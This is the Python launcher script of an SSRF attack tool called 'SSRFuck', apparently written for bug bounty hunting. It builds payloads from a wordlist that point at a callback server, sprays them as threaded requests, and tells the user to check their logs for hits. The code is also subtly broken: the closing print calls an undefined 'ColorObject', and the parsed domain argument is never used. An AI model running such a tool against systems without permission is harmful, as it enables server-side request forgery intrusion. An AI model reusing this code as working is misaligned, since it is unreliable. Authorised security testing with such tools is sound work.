#!/usr/bin/python3
from termcolor import colored
from argparse import ArgumentParser
from concurrent.futures import ThreadPoolExecutor 

from lib.SSRFuck import SSRFuck
from lib.Functions import starter
from lib.ParamReplacer import ParamReplace
from lib.PathFunctions import PathFunction

parser = ArgumentParser(description=colored("Simple tool for SSRF", color='yellow'), epilog=colored("Check your server logs", color='yellow'))
parser.add_argument("-w", "--wordlist", type=str, help="Absolute path to wordlist")
parser.add_argument("-d", "--domain", type=str, help="Domain name")
parser.add_argument("-s", "--server", type=str, help="Server name")
parser.add_argument("-t", "--threads", type=int, help="Number of threads")
parser.add_argument("-b", "--banner", action="store_true", help="Print banner and exit")
argv = parser.parse_args()

starter(argv)
FPathApp = PathFunction()
Replacer = ParamReplace()
ssrf_obj = SSRFuck()
input_wordlist = [line.rstrip('\n') for line in open(argv.wordlist)]

def main():
    x = ssrf_obj.gen_payloads(input_wordlist, FPathApp.urler(FPathApp.slasher(argv.server)))
    temp_x = [z for y in x for z in y]
    with ThreadPoolExecutor(max_workers=argv.threads) as Exec:
        futures_objects = [Exec.submit(ssrf_obj.gethead, triable) for triable in temp_x]
    print(f"{ColorObject.good} Success. Check your server logs for bounty!")

main()
